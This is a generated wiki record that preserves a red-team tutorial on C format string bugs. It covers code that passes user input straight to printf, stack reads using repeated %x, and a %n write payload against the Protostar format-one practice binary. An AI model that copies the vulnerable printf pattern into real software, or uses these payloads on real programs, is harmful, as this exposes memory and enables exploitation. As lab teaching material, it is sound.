---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Format String Bug

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-injection-process-injection-binary-exploitation-format-string-bug` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/binary-exploitation/format-string-bug.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Format String Bug](../../topics/offensive-security/format-string-bug.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-injection-process-injection-binary-exploitation-format-string-bug |
| name | Format String Bug |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/binary-exploitation/format-string-bug.md |

## Preserved Source Material

````yaml
_asset_filenames:
- image (1076).png
- image (1077).png
- image (1078).png
- image (1080).png
- image (1081).png
_body: "# Format String Bug\n\nSome notes on what a format string bug is and how it looks like in real life.\n\n## Overview\n\
  \nFormat String bug appears in programs written in C, which means this bug is applicable to all operating systems that have\
  \ a C compiler, or in other words - most of OSes.\n\n## What is Format String?\n\n> **printf format string** refers to a\
  \ control parameter used by a class of [functions](https://en.wikipedia.org/wiki/Function\\_\\(computer\\_science\\)) in\
  \ the input/output libraries of [C](https://en.wikipedia.org/wiki/C\\_\\(programming\\_language\\)) and many other [programming\
  \ languages](https://en.wikipedia.org/wiki/Programming\\_languages). The string is written in a simple [template language](https://en.wikipedia.org/wiki/Template\\\
  _language): characters are usually copied literally into the function's output, but **format specifiers**, which start with\
  \ a [`%`](https://en.wikipedia.org/wiki/Percent\\_sign) character, indicate the location and method to translate a piece\
  \ of data (such as a number) to characters.\\\n> [\\\n> https://en.wikipedia.org/wiki/Printf\\_format\\_string](https://en.wikipedia.org/wiki/Printf\\\
  _format\\_string)\n\nIn other words, format string allows the programmer to specify how a certain value, say a floating-point\
  \ number such as money savings, should be printed to the screen.\n\nLet's look at the below code example, where the `savings`\
  \ variable is defined as a floating value of `345.82`, which is printed to the screen with `printf`, using the format string\
  \ `Savings: $%f`:\n\n{% hint style=\"info\" %}\nThe `%f` in the format string tells the `printf()` to print the value of\
  \ `savings` as a floating-point value.\n{% endhint %}\n\n{% code title=\"fmt-00.c\" %}\n```c\n#include <stdio.h>\n#include\
  \ <stdlib.h>\n\nint main( int argc, char *argv[] )\n{\n        double savings = 345.82;\n        \n        // The first\
  \ argument is the format string.\n        // It tells printf to print the value of savings as a floating value.\n      \
  \  printf(\"Savings: $%f\", savings);\n        return 0;\n}\n```\n{% endcode %}\n\nLet's compile, run the code and observe\
  \ the result:\n\n```\ngcc .\\fmt-00.c -o fmt-00.exe; .\\fmt-00.exe\n```\n\n...we can see that the `savings` value was printed\
  \ with 6 decimal places:\n\n![](<../../../.gitbook/assets/image (1076).png>)\n\nHowever, `$345.820000` is not the precision\
  \ we need when dealing with money, so it would look better if the value only had 2 decimal places, such as `$345.82`. With\
  \ the help of format string `Savings: $%.2f`, we can achieve exactly that:\n\n![](<../../../.gitbook/assets/image (1077).png>)\n\
  \n## What is Format String Bug?\n\nPrograms become vulnerable to the format string bug when user supplied data is included\
  \ in the format string the program uses to display the data when in print functions such as (not limited to):\n\n```c\n\
  printf\nfprintf\nsprintf\nsnprintf\n...\n```\n\n## Memory Read\n\nFormat string vulnerabilities make it possible to read\
  \ stack memory of the vulnerable program.\n\nLet's look at the sample code provided below, that takes in the user supplied\
  \ argument 1 and uses it in inside the function `printf`, which means that the user's supplied string is used as a format\
  \ string for the <mark style=\"color:blue;\">`printf`</mark> function:\n\n{% code title=\"fmt.c\" %}\n```c\n#include <stdio.h>\n\
  #include <stdlib.h>\n\nint main( int argc, char *argv[] )\n{\n        if( argc != 2 )\n        {\n                printf(\"\
  Error - supply a format string please\\n\");\n                return 1;\n        }\n\n        printf( argv[1] );\n     \
  \   printf( \"\\n\" );\n\n        return 0;\n}\n```\n{% endcode %}\n\nLet's compile and run the program without feeding\
  \ it any strings first:\n\n```\ngcc .\\fmt.c -o fmt.exe; .\\fmt.exe\n```\n\n![](<../../../.gitbook/assets/image (1078).png>)\n\
  \nLet's now supply a string format, say `Testing: 0x%x`:\n\n```\ngcc .\\fmt.c -o fmt.exe; .\\fmt.exe \"Testing: 0x%x\"\n\
  ```\n\n![](<../../../.gitbook/assets/image (1081).png>)\n\nConsidering the fact that the format string is supplied, but\
  \ the corresponding variable is not (which would be provided in the program written by a programmer, however in our case\
  \ we are supplying the format string to the program via a commandline argument without associated variables), the program\
  \ simply **starts reading values from the stack memory**. Note that there is nothing preventing us from reading even multiple\
  \ values from the stack too:\n\n```\ngcc .\\fmt.c -o fmt.exe; .\\fmt.exe \"Reading stack memory: 0x%x 0x%x 0x%x 0x%x\"\n\
  ```\n\n![](<../../../.gitbook/assets/image (1080).png>)\n\nThe above example illustrates how it may be possible to abuse\
  \ this bug to read program's stack memory, which may reveal some sensitive information, such as authentication passwords.\n\
  \n## Memory Write\n\nFormat string vulnerabilities make it possible to write to arbitrary memory locations inside the vulnerable\
  \ program.\n\nTo see this in action, we're going to use the following purposely vulnerable code from:\n\n{% embed url=\"\
  https://exploit.education/protostar/format-one\" %}\n\n```cpp\n#include <stdlib.h>\n#include <unistd.h>\n#include <stdio.h>\n\
  #include <string.h>\n\nint target;\n\nvoid vuln(char *string)\n{\n  printf(string);\n  \n  if(target) {\n      printf(\"\
  you have modified the target :)\\n\");\n  }\n}\n\nint main(int argc, char **argv)\n{\n  vuln(argv[1]);\n}\n```\n\n```\n\
  ./format1 \"` python -c \"print 'AAAA' + 'x38\\x96\\x04\\x08' + 'BBBBBBBBBBBBBBBBBBBBBB' + '%x '*128 \" `\"; echo\n```\n\
  \n### Exploit\n\n```\n./format1 \"` python -c \"print 'AAAA' + 'x38\\x96\\x04\\x08' + 'BBBBBBBBBBBBBBBBBBBBBB' + '%x '*127\
  \ + '%n ' \" `\"; echo\n```\n\n{% hint style=\"info\" %}\nIt's possible to abuse format bugs to execute shellcode, but I\
  \ could not get my dev environment setup to reproduce the exploitation examples found in the book and online, so these notes\
  \ are parked for the time being.\n{% endhint %}\n\n## References\n\n{% embed url=\"https://www.wiley.com/en-gb/The+Shellcoder%27s+Handbook%3A+Discovering+and+Exploiting+Security+Holes%2C+2nd+Edition-p-9780470080238\"\
  \ %}\n\n[https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf)"
_relative_path: offensive-security/code-injection-process-injection/binary-exploitation/format-string-bug.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/binary-exploitation/format-string-bug.md
````
